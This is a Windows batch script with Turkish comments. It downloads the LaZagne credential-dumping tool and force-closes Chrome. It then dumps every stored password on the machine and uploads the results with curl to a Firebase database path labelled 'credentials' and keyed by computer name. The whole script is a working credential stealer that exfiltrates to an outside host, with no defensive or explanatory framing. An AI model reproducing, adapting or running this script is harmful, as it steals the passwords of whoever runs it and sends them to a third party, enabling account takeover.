@echo off
setlocal enabledelayedexpansion

:: Ayarlar
set "LAZ_URL=https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe"
set "LAZ_EXE=%TEMP%\lazagne.exe"
set "RESULT_DIR=%TEMP%\results"
set "FIREBASE_URL=https://check-6c35e-default-rtdb.asia-southeast1.firebasedatabase.app/credentials/%COMPUTERNAME%"

echo ------------------------------------------------------------
echo [INFO] Script basladi: %DATE% %TIME%
echo ------------------------------------------------------------

:: Lazagne.exe varsa indirimi
if exist "%LAZ_EXE%" (
    echo [INFO] Lazagne.exe zaten mevcut, indirilmiyor.
) else (
    echo [INFO] Lazagne indiriliyor...
    powershell -Command "Invoke-WebRequest -Uri '%LAZ_URL%' -OutFile '%LAZ_EXE%' -UseBasicParsing"
    if errorlevel 1 (
        echo [ERROR] Lazagne indirilemedi!
        pause
        exit /b 1
    )
    echo [OK] Lazagne indirildi.
)

:: Chrome varsa kapat
tasklist /FI "IMAGENAME eq chrome.exe" 2>NUL | find /I "chrome.exe" >NUL
if errorlevel 1 (
    echo [INFO] Chrome acik degil.
) else (
    echo [INFO] Chrome calisiyor, kapatiliyor...
    taskkill /IM chrome.exe /F >nul 2>&1
    if errorlevel 1 (
        echo [WARN] Chrome kapatilamadi.
    ) else (
        echo [OK] Chrome kapatildi.
    )
)

:: Sonuc klasoru olustur
if not exist "%RESULT_DIR%" (
    mkdir "%RESULT_DIR%"
    if errorlevel 1 (
        echo [ERROR] Sonuc klasoru olusturulamadi!
        pause
        exit /b 1
    )
)
echo [OK] Sonuc klasoru: %RESULT_DIR%

:: Kod sayfasini UTF-8 olarak ayarla
chcp 65001 >nul

:: LaZagne ile tum credential’lari topla
if not exist "%LAZ_EXE%" (
    echo [ERROR] Lazagne.exe bulunamadi!
    pause
    exit /b 1
)
echo [INFO] LaZagne calistiriliyor...
echo Running: "%LAZ_EXE%" all -oN -output "%RESULT_DIR%"
"%LAZ_EXE%" all -oN -output "%RESULT_DIR%"
if errorlevel 1 (
    echo [ERROR] LaZagne calistirilirken hata olustu.
    dir "%RESULT_DIR%" | find "lazagne_results.txt" >nul
    if errorlevel 1 (
        echo [ERROR] Sonuc dosyasi olusturulamadi!
        pause
        exit /b 1
    ) else (
        echo [INFO] Sonuc dosyasi mevcut, islem devam ediyor...
    )
) else (
    echo [OK] LaZagne tamamlandi, cikti: %RESULT_DIR%\lazagne_results.txt
)

:: Sonuc dosyasinin varligini kontrol et
if not exist "%RESULT_DIR%\lazagne_results.txt" (
    echo [ERROR] Sonuc dosyasi bulunamadi!
    pause
    exit /b 1
)
echo [OK] Sonuc dosyasi mevcut: %RESULT_DIR%\lazagne_results.txt

:: Sonuclarin Firebase'e yuklenmesi (curl ile)
echo [INFO] Sonuclar Firebase'e yukleniyor...
for %%F in ("%RESULT_DIR%\*.txt") do (
    echo   -> Yukleniyor: %%~nxF
    curl.exe -X PUT -d @%%F "%FIREBASE_URL%/%%~nxF.json" --silent --show-error
    if errorlevel 1 (
        echo [ERROR] %%~nxF yuklenemedi!
        pause
        exit /b 1
    ) else (
        echo [OK] %%~nxF yuklendi.
    )
)

echo ------------------------------------------------------------
echo [INFO] Tum islem tamamlandi: %DATE% %TIME%
echo ------------------------------------------------------------
echo Cikmak icin bir tusa basin...
pause >nul
exit /b 0
